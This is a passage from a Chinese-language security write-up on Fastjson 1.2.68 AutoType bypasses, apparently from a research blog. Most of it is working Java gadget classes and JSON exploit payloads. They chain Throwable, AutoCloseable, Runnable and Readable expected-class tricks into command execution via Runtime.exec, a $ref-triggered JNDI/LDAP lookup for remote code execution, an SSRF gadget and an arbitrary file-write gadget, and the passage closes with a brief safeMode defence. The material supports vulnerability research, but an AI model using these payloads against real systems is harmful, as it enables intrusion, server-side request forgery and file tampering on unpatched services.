因此可以反序列化继承自Throwable的异常类，在这里我们可以借助setter、getter等方法的自动调用，来挖掘gadget，下面是浅蓝师提供的一个Gadget：
```java
package org.heptagram.fastjson;

import java.io.IOException;

public class ViaThrowable extends Exception {
    private String domain;

    public ViaThrowable() {
        super();
    }

    public String getDomain() {
        return domain;
    }

    public void setDomain(String domain) {
        this.domain = domain;
    }

    @Override
    public String getMessage() {
        try {
            Runtime.getRuntime().exec("cmd /c ping "+domain);
        } catch (IOException e) {
            return e.getMessage();
        }
        return super.getMessage();
    }
}

```

测试载荷：

```
package org.heptagram.fastjson;
import com.alibaba.fastjson.JSONObject;

public class ThrowableMain {
    public static void main(String[] args) {
        String payload ="{\n" +
                "  \"@type\":\"java.lang.Exception\",\n" +
                "  \"@type\": \"org.heptagram.fastjson.ViaThrowable\",\n" +
                "  \"domain\": \"qbknro.dnslog.cn|calc\"\n" +
                "}";
        JSONObject.parseObject(payload);
    }
}


```

在上面的载荷中我们一共传入了两个 @type，其中第一个是期望类 (expectClass)，第二个是需要反序列化的类，经过这样构造后在检查 AutoTypeSupport 之前就已经返回了 clazz，之后接着为期望类选择反序列化的解析器，从而匹配到了 Throwable.class，之后当扫描到第二个 @type 指定的类名后将其作为 exClassName 传入 checkAutoType，此时 checkAutotype 传入的第二个参数为 Throable.class 也为 Exception.class 的接口，此时如果 exClassName 是实现或继承自 Throwable 就能过 checkAutotype，下面是执行的结果：  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422112808-c1ef607a-a31a-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210422112808-c1ef607a-a31a-1.jpg)

#### JavaBeanDeserializer

在 fastjson 中对大部分类都指定了特定的 deserializer，如果未指定则会通过 createJavaBeanDeserializer() 来指定 deserializer，通常情况下都是一些第三方类才会调用到这里：  
/com/alibaba/fastjson/1.2.68/fastjson-1.2.68-sources.jar!/com/alibaba/fastjson/parser/ParserConfig.java 832  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422112852-dc60a9c8-a31a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422112852-dc60a9c8-a31a-1.png)  
在 FastJSON 中 com.alibaba.fastjson.util.TypeUtils#addBaseClassMappings 用于添加一些基本的类并将其当做缓存使用，但是在查看时可以发现这里的额外加载了一个 java.lang.AUtoCloseable 类，同时并未为其指定 deserializer，因此会走到最后的 else 条件中去，之后对应的 JavaBeanDeserializer，而且 java.lang.AUtoCloseable 类位于 mapping 缓存中，所以可以无条件反序列化：  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422112913-e8b2d8ae-a31a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422112913-e8b2d8ae-a31a-1.png)  
和之前一样，我们可以通过继承或者实现 AutoCloseable 类来绕过 autotype 反序列化检测，测试代码如下：

```
package org.heptagram.fastjson;

import java.io.IOException;
import java.io.Closeable;

public class ViaAutoCloseable  implements Closeable {
    private String domain;

    public ViaAutoCloseable() {
    }

    public ViaAutoCloseable(String domain) {
        this.domain = domain;
    }

    public String getDomain() {
        try {
            Runtime.getRuntime().exec(new String[]{"cmd", "/c", "ping " + domain});
        } catch (IOException e) {
            e.printStackTrace();
        }
        return domain;
    }

    public void setDomain(String domain) {
        this.domain = domain;
    }

    @Override
    public void close() throws IOException {

    }
}


```

载荷构造：

```
package org.heptagram.fastjson;

import com.alibaba.fastjson.JSONObject;

public class AutoCloseableMain {
    public static void main(String[] args) {
        String payload ="{\n" +
                "  \"@type\":\"java.lang.AutoCloseable\",\n" +
                "  \"@type\": \"org.heptagram.fastjson.ViaAutoCloseable\",\n" +
                "  \"domain\": \" wme8bg.dnslog.cn| calc\"\n" +
                "}";
        JSONObject.parseObject(payload);
    }
}


```

执行结果如下：  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422113001-057210ae-a31b-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210422113001-057210ae-a31b-1.jpg)  
在这里我们查看以下 AutoCloseable 类的继承关系，可以看到通过 AutoCloseable 来 Bypass AutoType 我们找寻 Gadget 的范围则变得更加宽广，常用的流操作、文件操作、socket 等等都继承自 AutoCloseable：  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422113042-1dbee704-a31b-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210422113042-1dbee704-a31b-1.jpg)  
在查阅相关资料的时候看到 Y4er 师傅在其文章中描述到 FastJson 在黑名单中新增的 java.lang.Runnable、java.lang.Readable 类也可以用于 Bypass AutoType，下面是 Y4er 师傅提供的载荷：  
A、Runnable：

```
package org.heptagram.fastjson;

import java.io.IOException;

public class ExecRunnable implements AutoCloseable {
    private EvalRunnable eval;

    public EvalRunnable getEval() {
        return eval;
    }

    public void setEval(EvalRunnable eval) {
        this.eval = eval;
    }

    @Override
    public void close() throws Exception {

    }
}

class EvalRunnable implements Runnable {
    private String cmd;

    public String getCmd() {
        System.out.println("EvalRunnable getCmd() "+cmd);
        try {
            Runtime.getRuntime().exec(new String[]{"cmd","/c",cmd});
        } catch (IOException e) {
            e.printStackTrace();
        }
        return cmd;
    }

    public void setCmd(String cmd) {
        this.cmd = cmd;
    }

    @Override
    public void run() {

    }
}


```

执行载荷：

```
package org.heptagram.fastjson;

import com.alibaba.fastjson.JSONObject;

public class ExecRunnableMain {
    public static void main(String[] args) {
        String payload ="{\n" +
                "  \"@type\":\"java.lang.AutoCloseable\",\n" +
                "  \"@type\": \"org.heptagram.fastjson.ExecRunnable\",\n" +
                "  \"eval\":{\"@type\":\"org.heptagram.fastjson.EvalRunnable\",\"cmd\":\"calc.exe\"}\n" +
                "}";
        JSONObject.parseObject(payload);
    }
}


```

执行结果：  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422113149-45d703fc-a31b-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210422113149-45d703fc-a31b-1.jpg)  
B、Readable：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422113209-51def8d0-a31b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422113209-51def8d0-a31b-1.png)

```
package org.heptagram.fastjson;

import java.io.IOException;
import java.nio.CharBuffer;

public class ExecReadable implements AutoCloseable {
    private EvalReadable eval;

    public EvalReadable getEval() {
        return eval;
    }

    public void setEval(EvalReadable eval) {
        this.eval = eval;
    }

    @Override
    public void close() throws Exception {

    }
}

class EvalReadable implements Readable {
    private String cmd;

    public String getCmd() {
        System.out.println("EvalReadable getCmd() "+cmd);
        try {
            Runtime.getRuntime().exec(new String[]{"cmd", "/c", cmd});
        } catch (IOException e) {
            e.printStackTrace();
        }

        return cmd;
    }

    public void setCmd(String cmd) {
        this.cmd = cmd;
    }

    @Override
    public int read(CharBuffer cb) throws IOException {
        return 0;
    }
}


```

攻击载荷：

```
package org.heptagram.fastjson;

import com.alibaba.fastjson.JSONObject;

public class ExecReadableMain {
    public static void main(String[] args) {
        String payload ="{\n" +
                "  \"@type\":\"java.lang.AutoCloseable\",\n" +
                "  \"@type\": \"org.heptagram.fastjson.ExecReadable\",\n" +
                "  \"eval\":{\"@type\":\"org.heptagram.fastjson.EvalReadable\",\"cmd\":\"calc.exe\"}\n" +
                "}";
        JSONObject.parseObject(payload);
    }
}


```

执行结果：  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422113250-6a4d7e82-a31b-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210422113250-6a4d7e82-a31b-1.jpg)  
$ref 拓展使用  
在 checkAutoType 检查分析部分我们说道找寻合适的 JNDI 较为困难，其原因是大多数 JNDI 的 gadget 都继承自 DataSource 和 RowSet，所以反序列化的类过不了 checkAutoType 的检查，那么 JNDI 注入真的就无法使用了吗？浅蓝师傅和 threedr3am 师傅给出了关于通过 $ref 引用功能来触发 getter 的方法，理论上我们可以通过这种方式实现 RCE，而且还能够在不开启 AutoType 的情况下，任意调用大部分当前反序列化对象的 getter 方法，如果存在危险的 method 则可以进行攻击，下面我们分别来看一下具体的方法：  
浅蓝师傅给出的示例 (原来的基础上稍有变形)：

```
package org.heptagram.fastjson;

import javax.activation.DataSource;
import javax.activation.URLDataSource;
import java.net.URL;

public class RefSSRF extends Exception {

    public RefSSRF() {
    }
    private DataSource dataSource;

    public DataSource getDataSource() {
        return dataSource;
    }
    public void setDataSource(URL url) {
        this.dataSource = new URLDataSource(url);
    }
}


```

执行载荷：

```
package org.heptagram.fastjson;

import com.alibaba.fastjson.JSON;

public class RefSSRFMain {
    public static void main(String[] args) {
        String a ="{\n" +
                "  \"@type\": \"java.lang.Exception\",\n" +
                "  \"@type\": \"org.heptagram.fastjson.RefSSRF\",\n" +
                "  \"dataSource\": {\n" +
                "    \"@type\": \"java.net.URL\",\n" +
                "    \"val\": \"http://127.0.0.1:4444/Exploit\"\n" +
                "  }\n" +
                "}";
        JSON.parseObject(a);
    }
}


```

执行之后可以看到有请求过来：  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422113420-9f8c235a-a31b-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210422113420-9f8c235a-a31b-1.jpg)  
这里我们对原理做一个简单的介绍：  
可以看到载荷中一共传入了两个 @type，其中第一个为 java.lang.Exception，它是 Throwable 的继承类，而用于反序列化 Throwable 异常类的是 ThrowableDeserializer，所以又进入到了之前的 execeptClass 部分，之后根据根据第二个 @type 的值来获取具体类，并且根据传入的指定期望类进行加载：  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422113504-ba11a5a6-a31b-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210422113504-ba11a5a6-a31b-1.jpg)  
之后在 RefSSRF 中将第二个 @type 的数值作为参数传入，同时注意到这里的 setDataSource 的参数是 URL 类型，在 FastJSON 中 URL 类型允许被反序列化，也就是说可以调用到 setDataSource 方法，并且实例化一个 URLDataSource 对象：  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422113540-cf745f56-a31b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422113540-cf745f56-a31b-1.png)  
如果我们要实现 SSRF 那么我们可以通过调用 URLDataSource 的 getInputStream() 方法来触发连接请求，而使用 JSON.parseObject 在解析 JSON 时默认就会调用 getInstance()(在 setXXX 之后调用)，从而实现 SSRF:  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422113556-d90062a4-a31b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210422113556-d90062a4-a31b-1.png)  
通过 $ref 引用功能，我们可以触发大部分 getter 方法，理论上当存在危险的 method 方法时我们可以通过此种方法在不开启 AutoType 的情况下来实现 RCE，下面以 threedr3am 师傅提供的 payload 为例 (代码部分取自 Y4er 师傅)：

```
package org.heptagram.fastjson;

import com.alibaba.fastjson.JSON;
import org.apache.shiro.jndi.JndiLocator;
import org.apache.shiro.util.Factory;
import javax.naming.NamingException;

public class RefRCE  <T> extends JndiLocator implements Factory<T>, AutoCloseable {
    private String resourceName;

    public RefRCE() {
    }

    public T getInstance() {
        System.out.println(getClass().getName() + ".getInstance() invoke.");
        try {
            return (T) this.lookup(this.resourceName);
        } catch (NamingException var3) {
            throw new IllegalStateException("Unable to look up with jndi name '" + this.resourceName + "'.", var3);
        }
    }

    public String getResourceName() {
        System.out.println(getClass().getName() + ".getResourceName() invoke.");
        return this.resourceName;
    }

    public void setResourceName(String resourceName) {
        System.out.println(getClass().getName() + ".setResourceName() invoke.");
        this.resourceName = resourceName;
    }

    @Override
    public void close() throws Exception {
    }
}


```

载荷部分：

```
package org.heptagram.fastjson;

import com.alibaba.fastjson.JSON;

public class RefRCEMain {
    public static void main(String[] args) {
        String json = "{\n" +
                "  \"@type\":\"java.lang.AutoCloseable\",\n" +
                "  \"@type\": \"org.heptagram.fastjson.RefRCE\",\n" +
                "  \"resourceName\": \"ldap://localhost:1099/Exploit\",\n" +
                "  \"instance\": {\n" +
                "    \"$ref\": \"$.instance\"\n" +
                "  }\n" +
                "}";
        System.out.println(json);
        JSON.parse(json);

    }
}


```

执行结果：  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422113650-f8ea9170-a31b-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210422113650-f8ea9170-a31b-1.jpg)

#### 文件相关操作

Gadget 寻找思路 (浅蓝师傅提供)：

*   通过 set 方法或构造方法指定文件路径的 OutputStream
*   通过 set 方法或构造方法传入字节数据的 OutputStream，并且可以通过 set 方法或构造方法传入一个 OutputStream，最后可以通过 write 方法将传入的字节码 write 到传入的 OutputStream
*   需要一个通过 set 方法或构造方法传入一个 OutputStream，并且可以通过调用 toString、hashCode、get、set、构造方法调用传入的 OutputStream 的 flush 方法  
    下面是个网络上公开的一个 Gadget，目前只适用于 JDK11 版本：  
    ```java  
    $ echo -ne "RMB122 is here" | openssl zlib | base64 -w 0  
    eJwL8nUyNDJSyCxWyEgtSgUAHKUENw==

$ echo -ne "RMB122 is here" | openssl zlib | wc -c  
22

```
载荷如何：
```java
{
    '@type':"java.lang.AutoCloseable",
    '@type':'sun.rmi.server.MarshalOutputStream',
    'out':
    {
        '@type':'java.util.zip.InflaterOutputStream',
        'out':
        {
           '@type':'java.io.FileOutputStream',
           'file':'dst',
           'append':false
        },
        'infl':
        {
            'input':
            {
                'array':'eJwL8nUyNDJSyCxWyEgtSgUAHKUENw==',
                'limit':22
            }
        },
        'bufLen':1048576
    },
    'protocolVersion':1
}

```

测试载荷：

```
package org.heptagram.fastjson;

import com.alibaba.fastjson.JSON;
import java.io.IOException;

public class FileWrite {
    public static void main(String[] args) throws IOException {
        String json = "{\n" +
                "  '@type': \"java.lang.AutoCloseable\",\n" +
                "  '@type': 'sun.rmi.server.MarshalOutputStream',\n" +
                "  'out': {\n" +
                "    '@type': 'java.util.zip.InflaterOutputStream',\n" +
                "    'out': {\n" +
                "      '@type': 'java.io.FileOutputStream',\n" +
                "      'file': 'e:/filewrite.txt',\n" +
                "      'append': false\n" +
                "    },\n" +
                "    'infl': {\n" +
                "      'input': {\n" +
                "        'array': 'eJwL8nUyNDJSyCxWyEgtSgUAHKUENw==',\n" +
                "        'limit': 22\n" +
                "      }\n" +
                "    },\n" +
                "    'bufLen': 1048576\n" +
                "  },\n" +
                "  'protocolVersion': 1\n" +
                "}";
        JSON.parse(json);
    }
}


```

执行结果：  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20210422113828-33e22702-a31c-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210422113828-33e22702-a31c-1.jpg)

防御措施
----

开启 safeMode

```
ParserConfig.getGlobalInstance().setSafeMode(true);


```

参考链接
----

[https://b1ue.cn/archives/348.html](https://b1ue.cn/archives/348.html)  
[https://b1ue.cn/archives/382.html](https://b1ue.cn/archives/382.html)  
[https://y4er.com/post/fastjson-bypass-autotype-1268/](https://y4er.com/post/fastjson-bypass-autotype-1268/)  
[https://www.kingkk.com/2020/06/%E6%B5%85%E8%B0%88%E4%B8%8BFastjson%E7%9A%84autotype%E7%BB%95%E8%BF%87/](https://www.kingkk.com/2020/06/%E6%B5%85%E8%B0%88%E4%B8%8BFastjson%E7%9A%84autotype%E7%BB%95%E8%BF%87/)  
[https://github.com/threedr3am/learnjavabug/blob/96f81b85bab45453d8c29465225b51f3900148f3/fastjson/src/main/java/com/threedr3am/bug/fastjson/file/FileWriteBypassAutoType1_2_68.java](https://github.com/threedr3am/learnjavabug/blob/96f81b85bab45453d8c29465225b51f3900148f3/fastjson/src/main/java/com/threedr3am/bug/fastjson/file/FileWriteBypassAutoType1_2_68.java)  
[https://rmb122.com/2020/06/12/fastjson-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-gadgets-%E6%8C%96%E6%8E%98%E7%AC%94%E8%AE%B0/](https://rmb122.com/2020/06/12/fastjson-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-gadgets-%E6%8C%96%E6%8E%98%E7%AC%94%E8%AE%B0/)